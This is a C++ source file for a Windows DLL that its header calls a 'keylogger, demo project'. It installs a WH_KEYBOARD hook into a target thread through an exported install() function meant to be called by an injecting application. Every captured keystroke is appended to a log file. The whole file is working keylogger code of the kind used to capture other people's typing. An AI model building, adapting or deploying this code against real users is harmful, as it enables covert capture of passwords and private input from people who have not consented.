/**@file main.cpp
 *
 * This is part of keylogger, demo project to hook key event of a process
 * and do periodic screenshoot of screen.
 *
 * @author Oky Firmansyah <mail@okyfirmansyah.net>.
 *
 * @date Created      : Apr 03, 2017 okyfirmansyah
 */

#include "main.h"
#include <stdio.h>

#if defined(__GNUC__) || defined(__GNUG__)
#define GCC_SHARED_ATTR __attribute__((section ("shared_seg"), shared))
#else
#define GCC_SHARED_ATTR
#endif

HINSTANCE hinst;

#if defined(_MSC_VER)
#pragma data_seg(".shared")
#endif

HHOOK GCC_SHARED_ATTR hhk;
char GCC_SHARED_ATTR targetLogName[512];
char GCC_SHARED_ATTR lastKey=0;
int GCC_SHARED_ATTR lastKeyCount=0;
#if defined(_MSC_VER)
#pragma data_seg()
#endif // defined


/**Main KeyboardProc handler
 */
LRESULT CALLBACK  wireKeyboardProc(int code, WPARAM wParam,LPARAM lParam) {
    // pass to next hook
    if (code < 0) {
        return CallNextHookEx(0, code, wParam, lParam);
    }

    if(code==HC_ACTION )
    {
        char key=(char)wParam&0xFF;

        // simple repeated stroke filtering
        if(lastKey==key && lastKeyCount<3)
            lastKeyCount++;
        else
        {
            lastKeyCount=0;
            lastKey=key;

            // lets log down the key
            FILE* fp=fopen(targetLogName,"ab");

            if(fp)
            {
                fprintf(fp, "%c",key);
                fclose(fp);
            }
        }
    }

    // finally forward key event to the next hook
    return CallNextHookEx(hhk, code, wParam, lParam);
}

/**Hook installation routine, will be called by injecting application
 */
extern "C" __declspec(dllexport) void install(unsigned long threadID, const char* fileName) {

    hhk = SetWindowsHookEx(WH_KEYBOARD, wireKeyboardProc, hinst, threadID);
    if(hhk)
    {
        strncpy(targetLogName, fileName, sizeof(targetLogName));
        Beep(1000, 50); // just silly notification that the hook already hooked
    }
}

/** Dll main entry, we dont really have interest on this for now
 */
extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    hinst=hinstDLL;
    return TRUE;
}
